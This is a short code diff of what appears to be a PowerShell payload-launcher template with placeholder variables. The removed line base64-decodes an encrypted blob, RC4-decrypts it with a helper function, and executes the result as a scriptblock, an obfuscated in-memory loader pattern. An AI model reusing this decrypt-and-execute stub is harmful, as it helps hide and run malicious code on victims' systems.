@@ -36,5 +36,3 @@ function %{func_rc4_decrypt} {
     $%{var_rc4buffer}
 }
 
-&([scriptblock]::create(([system.Text.Encoding]::UTF8).GetString((%{func_rc4_decrypt} ([System.Convert]::FromBase64String("%{b64payload}"))))))
-
